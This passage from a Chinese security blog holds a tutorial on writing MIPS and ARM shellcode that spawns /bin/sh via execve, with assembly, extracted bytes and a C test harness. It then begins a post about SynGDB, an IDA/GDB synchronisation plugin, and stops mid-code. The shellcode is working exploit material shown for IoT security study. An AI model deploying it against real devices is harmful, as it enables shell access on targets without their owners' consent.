<p><code>li $v0,4004</code> 设置 <code>$v0</code> 寄存器为 <code>write</code> 的系统调用号  <a href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h">查看 <code>MIPS</code> 架构的系统调用号</a></p>
<p><code>syscall</code> 触发系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-as write.s -o write.o</span><br><span class="line">mips-linux-gnu-ld write.o -o write</span><br></pre></td></tr></table></figure>

<p>上面两条命令首先使用汇编器 <code>mips-linux-gnu-as</code> 将 <code>write.s</code> 中的汇编代码转换为机器码（生成文件 <code>write.o</code> ），再用链接器 <code>mips-linux-gnu-ld</code> 将刚生成的 <code>write.o</code> 链接为 <code>write</code> 可执行文件。</p>
<p>为了简化汇编和链接的过程，我们来编写一个 <code>shell</code> 脚本，起名为 <code>nasm.sh</code>（如下）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src=$1</span><br><span class="line">dst=$2</span><br><span class="line">mips-linux-gnu-as $1 -o s.o</span><br><span class="line">echo &quot;as ok&quot;</span><br><span class="line">mips-linux-gnu-ld s.o -o $dst</span><br><span class="line">echo &quot;ld ok&quot;</span><br><span class="line">rm s.o</span><br></pre></td></tr></table></figure>

<p>这样将编写的 <code>shellcode</code> 文件，变成可执行文件只需要使用 <code>./nasm.sh write.s write</code> 命令即可（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305131404932.png" alt="image-20230513140452675"></p>
<p>可以看到 <code>ABC\n</code> 字符串已经被成功输出，程序崩溃的原因是因为 <code>shellcode</code> 没有正常的退出，导致执行了不正确指令让程序崩溃。 想调试 <code>shellcode</code> 的话，方式和调试 <code>MIPS</code> 架构的程序是一模一样的。</p>
<h4 id="execve-系统调用"><a href="#execve-系统调用" class="headerlink" title="execve 系统调用"></a><code>execve</code> 系统调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0 </span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,20</span><br><span class="line">li $a1,0</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure>

<p>前四行的解释上面已经提过了，就不再赘述。</p>
<p><code>li $a2,0x111</code> <code>p:bltzal $a2,p</code>   <code>li $a2,0</code> 这三条指令的目的就是为了把 <code>addiu $sp,$sp,-32</code> 这条指令的地址放入 <code>$ra</code> 寄存器中。</p>
<p><code>addiu $sp,$sp,-32</code> 是为了开辟一个新的栈帧，大小为 <code>0x20</code></p>
<p><code>addiu $a0,$ra,20</code> 这个指令中的 <code>20</code> 很讲究，这就要牵扯到 <code>sc:</code> 以及后面的东西了<code>0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</code> 就是字符串 <code>/bin/sh</code> 。而这个字符串也是存放到了 <code>text</code> 段，就位于 <code>syscall</code> 后面的地址。因为 <code>MIPS</code> 架构中一个指令是固定的 <code>4</code> 字节，上面提到的 <code>$ra</code> 寄存器存储了 <code>addiu $sp,$sp,-32</code> 的地址，而这个指令距离 <code>/bin/sh</code> 中间还有 <code>5</code> 个指令，<code>4*5 = 20</code> 字节。因此这里的 <code>$a0</code> 拿到了 <code>/bin/sh</code> 字符串的地址。</p>
<p>目的是执行 <code>execve(&quot;/bin/sh\x00&quot;,0,0)</code> ，所以我们将 <code>$a1</code> <code>$a2</code> 寄存器设置为 <code>0</code> ，使用 <code>li</code> 指令进行赋值即可，<code>execve</code> 系统调用号为 <code>4011</code>。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142032761.png" alt="image-20230514203232473"></p>
<h4 id="shellcode的提取与测试"><a href="#shellcode的提取与测试" class="headerlink" title="shellcode的提取与测试"></a>shellcode的提取与测试</h4><p>2024&#x2F;4&#x2F;14 补充：可以直接在这个网站提取</p>
<p><a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">https://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p>
<p>将 <code>shellcode</code> 提取的话，我用的方法是将其放到 <code>IDA</code> 里面，然后 <code>shift+e</code> 提取（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142034440.png" alt="image-20230514203453331"></p>
<p>然后用下面的 <code>python</code> 脚本，<code>x</code> 列表里面放的是刚刚提前的数据，最后输出的内容便是 <code>shellcode</code> 字节码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = [  <span class="number">0x24</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0xD0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x24</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x27</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0C</span>]</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter the endian of the shell code&quot;</span>)</span><br><span class="line">choice=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;little&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">list</span>.extend(<span class="built_in">reversed</span>(x[i:i+<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;big&quot;</span>:</span><br><span class="line">  <span class="built_in">list</span> = x</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;\\x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>&#x27;</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">list</span>])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>最后就是测试提取出来的字节码能否正确执行，我们使用下面的 <code>C</code> 脚本（要<strong>注意编译完程序的字节序</strong>，如果程序是大端的，而 <code>shellcode</code> 是按照小端序写的，那么肯定是运行失败的）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc shellcode.c -o test -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*s)(<span class="type">void</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sc size %d\n&quot;</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    s = shellcode;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142127071.png" alt="image-20230514212707011"></p>
<h3 id="shellcode编写（arm）"><a href="#shellcode编写（arm）" class="headerlink" title="shellcode编写（arm）"></a>shellcode编写（arm）</h3><p>学弟 <strong>monologue</strong> 后来在做一个 <code>arm</code> 的 <code>shellcode</code> 编写，这里就顺便也记录一下方法。下面是 <code>arm</code> 中调用 <code>execve(&quot;/bin/sh\x00&quot;,0,0)</code> 的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">movw r5,#0x732f</span><br><span class="line">movt r5,0x68</span><br><span class="line">push &#123;r5&#125;</span><br><span class="line">movw r5,#0x622f</span><br><span class="line">movt r5,#0x6e69</span><br><span class="line">push &#123;r5&#125;</span><br><span class="line">mov r0,sp</span><br><span class="line">mov r7,#0xb</span><br><span class="line">mov r1,#0</span><br><span class="line">mov r2,#0</span><br><span class="line">svc #0</span><br></pre></td></tr></table></figure>

<p>将其命名为 <code>write1.s</code> 执行下面的命令进行编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arm-linux-gnueabi-as write1.s -o write1.o</span><br><span class="line">arm-linux-gnueabi-ld write1.o -o write1</span><br></pre></td></tr></table></figure>

<p>调试编译好的 <code>shellcode</code> 可以参考 这篇 <a href="https://zikh26.github.io/posts/536aee5b.html?highlight=arm#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-amp-amp-%E5%90%AF%E5%8A%A8%E8%B0%83%E8%AF%95">文章</a></p>
<p>想将汇编代码转成机器码的话，可以通过这个 <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">网站</a> 直接转换，不需要上面再用 <code>IDA</code> 解析机器码的方式了</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi">mips_arm汇编学习 - Note (gitbook.io)</a></p>
<p><a href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">路由器漏洞分析环境搭建 | Prowes5’s Blog</a></p>
<p><a href="https://blog.csdn.net/yalecaltech/article/details/117326975">(47条消息) MIPS下shellcode编写_Elwood Ying的博客-CSDN博客</a></p>
<p><a href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">《IoT从入门到入土》(1)–MIPS交叉编译环境搭建及其32位指令集 (yuque.com)</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
      </tags>
  </entry>
  <entry>
    <title>SynGDB--同步GDB调试的IDA小插件</title>
    <url>/posts/c039484.html</url>
    <content><![CDATA[<h3 id="需求："><a href="#需求：" class="headerlink" title="需求："></a>需求：</h3><p>之前在复现 <code>IOT</code> 漏洞，为了捋清调用链进行 <code>GDB</code> 调试，但由于固件的代码量较大，而且函数之间的调用和跳转很多。导致了 <code>GDB</code> 这边每次函数跳转后都需要在 <code>IDA</code> 手动同步一下。久而久之，我发现这是一个重复且无意义且浪费时间的工作，我在想能否开发一个 <code>IDA</code> 插件用来自动同步 <code>GDB</code> 调试时的 <code>PC</code> 寄存器</p>
<span id="more"></span>

<h3 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h3><p>写了两个 <code>GDB</code> 命令，分别为 <code>local</code> 和 <code>sl</code> ，以及 <code>IDA</code> 的一个插件 <code>SynGDB</code></p>
<p>在 <code>IDA</code> 开启 <code>SynGDB</code> 后， <code>GDB</code> 界面输入 <code>local</code> 命令可以立刻将 <code>IDA</code> 同步到 <code>GDB</code> 当前的 <code>PC</code> 寄存器的位置，<code>sl</code> 命令可以让 <code>GDB</code> 单步执行一条指令并同步给 <code>IDA</code> </p>
<h3 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h3><p><video controls height='100%' width='100%' src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/video%2FE76604E910DA9BAC493BCF802C425DD3.mp4"></video></p>
<h3 id="最初的设计思路"><a href="#最初的设计思路" class="headerlink" title="最初的设计思路"></a>最初的设计思路</h3><p>我平常动态调试程序是放到虚拟机 <code>Ubuntu18.04</code> 中完成，而静态分析放到宿主机中的 <code>IDA</code> 进行。因此考虑将 <code>IDA</code> 插件启动一个服务端，虚拟机中写一个 <code>GDB</code> 的命令来启一个客户端。</p>
<p><code>GDB</code> 命令：首先建立与服务端的连接，监视 <code>PC</code> 寄存器，每当值发生改变时，就把当前 <code>PC</code> 寄存器的值发送给服务端</p>
<p><code>IDA</code> 插件：与客户端建立连接后，开启一个新的线程，不断循环，等待接受客户端发送过来的数据，用 <code>IDA pro python API</code> 中的函数，跳转到接收到的地址</p>
<p>之前已经将这部分的代码实现完成，但后来发现有问题又给删了，没有保留这部分代码。</p>
<h3 id="该设计思路存在的问题"><a href="#该设计思路存在的问题" class="headerlink" title="该设计思路存在的问题"></a>该设计思路存在的问题</h3><p>上述思路最直观的问题就是下了几个断点，然后 <code>C</code> 过去，那么 <code>PC</code> 寄存器会在极短时间内改变多次，从而短时间内多次发送给服务端数据。导致了服务端那边处理异常。</p>
<p>重新思考下这个插件的目的，这个插件只是为了自动同步 <code>GDB</code> 调试的位置，并没有必要每条指令都同步到 <code>IDA</code> 上，通常来说，只有我查看 <code>IDA</code> 的时候，我才希望去同步。那么我就没必要每条指令都同步给 <code>IDA</code> 这里。</p>
<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>因此我决定写成两个命令，一个为 <code>sl</code> ，一个为 <code>local</code></p>
<p><code>local</code> 命令是获取当前 <code>PC</code> 寄存器的值，然后发送给 <code>IDA</code> 使其同步。这个命令通常用于在 <code>GDB</code> 中执行了 <code>c</code> 命令或者多次 <code>n</code> 命令后，准备查看 <code>IDA</code> 时，执行 <code>local</code> ，同步 <code>IDA</code> 的位置</p>
<p><code>sl</code> 命令是对 <code>local</code> 命令的一个封装并添加了执行 <code>si</code> 命令的操作。如果需要具体调试某处地方观察上下文信息，那么需要 <code>GDB</code> 一边调试，一边查看 <code>IDA</code> 代码，那么可以执行 <code>sl</code> 命令， <code>GDB</code> 单步走一次，并同步到 <code>IDA</code> 上</p>
<h3 id="GDB命令的代码"><a href="#GDB命令的代码" class="headerlink" title="GDB命令的代码"></a>GDB命令的代码</h3><p><code>local</code> 命令的实现逻辑</p>
<ol>
<li>执行 <code>show architecture</code> 命令，根据返回值来判断当前程序的架构（因为不同架构的 <code>PC</code> 寄存器的名称不一样）</li>
<li>执行 <code>x/gx $pc</code> 命令，获取当前 <code>PC</code> 寄存器的值</li>
<li>对 <code>PC</code> 寄存器的值进行处理（因为有时候接收到的数据可能为 <code>0x411082 &lt;setvbuf@plt&gt;</code> 或者开启 <code>PIE</code> 后无法直接得到地址偏移，所以需要对数据进行提取处理）</li>
<li>将处理后的地址发送给服务端</li>
</ol>
<p>更新 <code>v1.0</code> ：修复了开 <code>PIE</code> 保护后无法同步正确偏移给 <code>IDA</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.110.172&#x27;</span><span class="comment">#IP with IDA host installed</span></span><br><span class="line">port = <span class="number">12626</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_program_base_address</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&#x27;vmmap&#x27;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;0x&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            base_address = line.split()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(base_address,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_pc_address</span>(<span class="params">raw_data</span>):</span><br><span class="line">    pattern = <span class="string">r&quot;^0x[0-9a-fA-f]+&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, raw_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        tmp=<span class="built_in">int</span>(<span class="keyword">match</span>.group(),<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> tmp &gt; <span class="number">0x7ffff0000000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] The address appears to be in libc and cannot be synchronized to IDA&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">elif</span> tmp &gt; <span class="number">0x555555550000</span>:</span><br><span class="line">            <span class="keyword">return</span> tmp - get_program_base_address()  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Abnormal data--Unable to parse the value of the current PC register&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">socket_write_data</span>(<span class="params">address</span>):</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    client_socket.connect((host, port))</span><br><span class="line">    client_socket.send(<span class="built_in">hex</span>(address).encode())</span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pc_name</span>():</span><br><span class="line">    arch_info = gdb.execute(<span class="string">&quot;show architecture&quot;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;x86-64&quot;</span> <span class="keyword">in</span> arch_info:</span><br><span class="line">        register_name = <span class="string">&quot;rip&quot;</span> </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;i386&quot;</span> <span class="keyword">in</span> arch_info:</span><br><span class="line">        register_name = <span class="string">&quot;eip&quot;</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        register_name = <span class="string">&quot;pc&quot;</span></span><br><span class="line">    <span class="keyword">return</span> register_name</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local_cmd</span>():</span><br><span class="line">    register=get_pc_name()</span><br><span class="line">    raw_address=gdb.execute(<span class="string">f&quot;x/gx $<span class="subst">&#123;register&#125;</span>&quot;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">    address=handle_pc_address(raw_address)</span><br><span class="line">    <span class="keyword">if</span> address == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    socket_write_data(address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl_cmd</span>():</span><br><span class="line">    gdb.execute(<span class="string">&quot;si&quot;</span>)</span><br><span class="line">    local_cmd()</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&quot;define sl\n\tpython sl_cmd()\nend&quot;</span>)</span><br><span class="line">gdb.execute(<span class="string">&quot;define local\n\tpython local_cmd()\nend&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后在 <code>.gdbinit</code> 文件中添加如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /home/zikh/Desktop/gdb_command/bind_ida.py</span><br><span class="line"></span><br><span class="line">define sl</span><br><span class="line">	python sl_cmd()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define local</span><br><span class="line">	python local_cmd()</span><br><span class="line">end</span><br></pre></td></tr></table></figure>



<h3 id="IDA插件代码"><a href="#IDA插件代码" class="headerlink" title="IDA插件代码"></a>IDA插件代码</h3><p><code>IDA python</code> 插件编写，要有一个注册插件的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">PLUGIN_ENTRY</span>():</span><br><span class="line">    <span class="keyword">return</span> SynGDB()<span class="comment">#该函数名要和插件名一样</span></span><br></pre></td></tr></table></figure>

<p>然后定义一个插件类，名称也为 <code>SynGDB</code> ，下面插件类中的方法和属性都是必须的，少一个内容，<code>IDA</code> 插件都无法正常检测到</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SynGDB</span>(ida_idaapi.plugin_t):</span><br><span class="line">    flags = ida_idaapi.PLUGIN_UNL</span><br><span class="line">    comment = <span class="string">&quot;Current instructions for synchronous GDB debugging&quot;</span></span><br><span class="line">    wanted_name = <span class="string">&quot;SynGDB&quot;</span></span><br><span class="line">    wanted_hotkey = <span class="string">&quot;Alt-F5&quot;</span><span class="comment">#这里设置的是插件快捷键</span></span><br><span class="line">    <span class="built_in">help</span>= <span class="string">&quot;Coming soon...&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#初始化操作，比如打印提示信息，导入功能模块；</span></span><br><span class="line">        <span class="keyword">return</span> ida_idaapi.PLUGIN_OK</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg</span>):</span><br><span class="line">        <span class="comment">#插件的入口函数，调用功能模块的函数</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">term</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#结束时调用的方法</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<p>在 <code>run</code> 函数中先开启 <code>socket</code> ，等待客户端的连接。这里要进行多线程操作，最初我这里用的是程序中直接开启 <code>socket</code> 等待客户端连接，然后在等待的连接中就直接造成了 <code>IDA</code> 未响应。所以这里必须要再开一个线程来处理接收数据</p>
<p>接收到地址后，用 <code>ida_kernwin.jumpto(address)</code> 函数来执行跳转。</p>
<p>正常来说，我需要在 <code>term</code> 函数中来关闭之前开的 <code>socket</code> ，因为这是插件关闭或者 <code>IDA</code> 退出时触发的函数（至少我在网上搜到是这样描述的），但我测试了一下发现，不知道为什么我这个插件刚运行的时候，<code>term</code> 函数就被触发了（观察下图能发现 <code>SynGDB plugin terminated</code> 这行字符串确实被输出了，而此时我刚刚启动插件，这个 <code>term</code> 函数就被触发）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201102744.png" alt="image-20230920105745918"></p>
<p>这意味着我无法在 <code>term</code> 函数中关闭之前开启的 <code>socket</code> ，因为这里的 <code>term</code> 函数并不是我要退出 <code>IDA</code> 时触发的。不关闭 <code>socket</code> 资源，就意味着之前占用的 <code>12626</code> 端口就始终存在。如果 <code>IDA</code> 关闭再打开，启动 <code>SynGDB</code> 插件时会报错，说端口已经被占用。我实在没想到有什么好方法在 <code>IDA</code> 退出时自动关闭掉之前打开的资源，退而求其次是给插件写一个专门的函数，并手动触发进行关闭 <code>socket</code>，但这并不是我期望的这样（这违背了我想减少做重复且无意义的初衷）</p>
<p>最终另辟蹊径，我在每次插件开启时，先去检测固定的端口 <code>12626</code> 是否被某个进程占用，如果被占用的话，则去关闭掉之前的进程，并进行后续操作</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入IDA Python模块</span></span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">12626</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PLUGIN_ENTRY</span>():<span class="comment"># 注册插件</span></span><br><span class="line">    <span class="keyword">return</span> SynGDB()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_and_jump_to_address</span>(<span class="params">address</span>):</span><br><span class="line">    func = ida_funcs.get_func(address)</span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;invalid address：0x<span class="subst">&#123;address:X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 执行跳转</span></span><br><span class="line">    ida_kernwin.jumpto(address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Ensure_port_availability</span>(<span class="params">port</span>):</span><br><span class="line">    <span class="keyword">with</span> os.popen(<span class="string">f&#x27;netstat -aon|findstr &quot;<span class="subst">&#123;port&#125;</span>&quot;&#x27;</span>) <span class="keyword">as</span> res:</span><br><span class="line">        res = res.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(res)&gt;<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> res:</span><br><span class="line">            temp=line.split()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;LISTENING&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">                pid=<span class="built_in">int</span>(temp[-<span class="number">1</span>])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;The PID <span class="subst">&#123;pid&#125;</span> occupying port <span class="subst">&#123;port&#125;</span>\n&quot;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    os.popen(<span class="string">f&quot;taskkill /F /PID <span class="subst">&#123;pid&#125;</span>&quot;</span>)</span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Try to kill <span class="subst">&#123;pid&#125;</span>,but failed&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Successfully killed PID:<span class="subst">&#123;pid&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Port <span class="subst">&#123;port&#125;</span> available&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_socket</span>():</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">if</span> Ensure_port_availability(port):</span><br><span class="line">        server_socket.bind((host, port))</span><br><span class="line">        <span class="keyword">return</span> server_socket</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Port <span class="subst">&#123;port&#125;</span> is not available&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">socket_get_address</span>(<span class="params">server_socket</span>):</span><br><span class="line">    server_socket.listen(<span class="number">1</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Waiting for gdb&#x27;s connection...&quot;</span>)</span><br><span class="line">    client_socket, client_address = server_socket.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Connected to gdb: <span class="subst">&#123;client_address&#125;</span>&quot;</span>)</span><br><span class="line">    data = client_socket.recv(<span class="number">64</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    received_number = <span class="built_in">int</span>(data.decode(), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> received_number</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个IDA插件类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SynGDB</span>(ida_idaapi.plugin_t):</span><br><span class="line">    flags = ida_idaapi.PLUGIN_UNL</span><br><span class="line">    comment = <span class="string">&quot;Current instructions for synchronous GDB debugging&quot;</span></span><br><span class="line">    wanted_name = <span class="string">&quot;SynGDB&quot;</span></span><br><span class="line">    wanted_hotkey = <span class="string">&quot;Alt-F5&quot;</span></span><br><span class="line">    <span class="built_in">help</span>= <span class="string">&quot;Coming soon...&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;SynGDB plugin initialized&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ida_idaapi.PLUGIN_OK</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server_socket = init_socket()</span><br><span class="line">            thread = threading.Thread(target=self.run_thread, args=(server_socket,))</span><br><span class="line">            thread.start()</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span 